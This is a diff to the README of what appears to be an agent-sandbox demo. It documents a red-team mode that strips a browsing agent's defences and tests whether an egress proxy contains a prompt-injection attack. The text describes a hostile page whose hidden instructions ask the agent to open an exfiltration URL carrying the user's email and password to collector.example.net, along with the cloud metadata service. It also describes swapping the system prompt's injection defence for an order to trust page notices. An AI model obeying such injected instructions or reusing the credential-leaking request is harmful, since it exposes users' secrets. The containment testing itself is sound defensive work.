@@ -64,7 +64,12 @@ The demo includes a hostile page (`/notes`, a neutral name so the URL doesn't ti
 
 ## Red-team mode: a compromised agent
 
-A well-behaved model simply ignores the injection, which shows the model is careful but not that the sandbox works. The **Compromised agent** flow simulates an agent whose defences have already failed: the run first does exactly what the page's hidden instructions ask (open `collector.example.net/verify?email=…&password=…` and the cloud metadata service), with the action policy switched off. The only thing left is the sandbox, and the run log shows each attempt being blocked by the egress proxy before any secret leaves. This red-team step is scripted (the URLs are taken from the page and opened with the policy off), so the result doesn't depend on whether a given model can be talked into it. The test password is substituted only at the moment of the request and is redacted from everything the model and the log see.
+A well-behaved model simply ignores the injection, which shows the model is careful but not that the sandbox works. The **Compromised agent** flow removes the defences one by one:
+
+1. **Compromise the model.** The injection defence in the system prompt is replaced by an order to trust notices on the page, the page is no longer marked as untrusted, and the action policy is off. If the model now emits `navigate collector.example.net/verify?email={{email}}&password={{password}}`, it runs, and only the sandbox can stop it.
+2. **If the model refuses** (in our tests `glm-5.3` refused about 6 times out of 7 and named the injection), the run simulates a fully compromised agent: it opens exactly the off-site URLs the page asks for, with the policy off.
+
+Either way the result is the same: the egress proxy blocks every attempt before any secret leaves, the UI shows a red "Containment: N of N escape attempts blocked" banner, and the run log says which layer was tested. The test password is substituted only at the moment of the request and is redacted from everything the model and the log see.
 
 ## Verify the containment yourself
 
